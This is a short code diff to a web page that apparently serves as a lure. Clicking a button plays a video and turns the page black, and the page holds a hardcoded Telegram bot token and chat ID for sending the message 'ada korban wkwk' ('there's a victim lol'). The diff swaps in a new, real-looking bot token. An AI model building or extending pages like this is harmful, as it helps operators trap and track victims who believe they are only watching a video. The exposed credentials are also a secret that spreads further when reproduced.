@@ -11,6 +11,7 @@
       align-items: center;
       background-color: #f0f0f0;
       flex-direction: column;
+      transition: background-color 0.5s ease;
     }
 
     .my-button {
@@ -56,13 +57,16 @@
     function showVideo() {
       const button = document.querySelector('.my-button');
       const video = document.getElementById('myVideo');
+      const body = document.body;
+
       button.style.display = 'none';
       video.style.display = 'block';
+      body.style.backgroundColor = '#000000'; // Ubah background jadi hitam
       video.play(); // Autoplay saat muncul
 
       // Token bot Telegram dan ID chat kamu
-      const botToken = '7848194295:AAH5ign5or4msaUqMSOKX5FQSMazZ_vKJgg'; // Ganti dengan token bot kamu
-      const chatId = '7420684427'; // Ganti dengan ID chat kamu
+      const botToken = '7579024338:AAGkv6LtQQH3uKtqD64DVNca4V7ZYwAyLT0';
+      const chatId = '7420684427';
 
       // Pesan yang ingin dikirim
       const message = 'ada korban wkwk';
